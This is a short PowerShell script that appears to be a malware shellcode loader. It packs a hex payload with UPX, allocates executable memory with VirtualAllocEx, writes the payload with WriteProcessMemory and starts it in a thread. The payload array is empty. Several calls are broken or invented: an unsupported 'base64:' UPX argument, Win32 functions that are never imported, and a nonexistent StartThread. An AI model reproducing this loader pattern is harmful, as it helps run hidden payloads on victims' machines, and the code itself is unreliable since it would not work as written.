$payload = @(
    #inside provide the payload  in hexa
)

$payloadString = ""
foreach ($byte in $payload) {
    $payloadString += [char]$byte
}
$encodedPayload = [Convert]::ToBase64String($payload)

$packedPayload = iex "upx --force --best --no-progress -q -o tmp.exe base64:$encodedPayload"
$payloadBytes = [System.IO.File]::ReadAllBytes("tmp.exe")

# allocate sum memory for the payload
$size = $payloadBytes.Length
$address = VirtualAllocEx(-1, 0, $size, 0x3000, 0x40)

# write the payload to the allocated memory
WriteProcessMemory(-1, $address, $payloadBytes, $size, 0)

# Execute the payload
$threadId = 0
StartThread($address, $threadId)
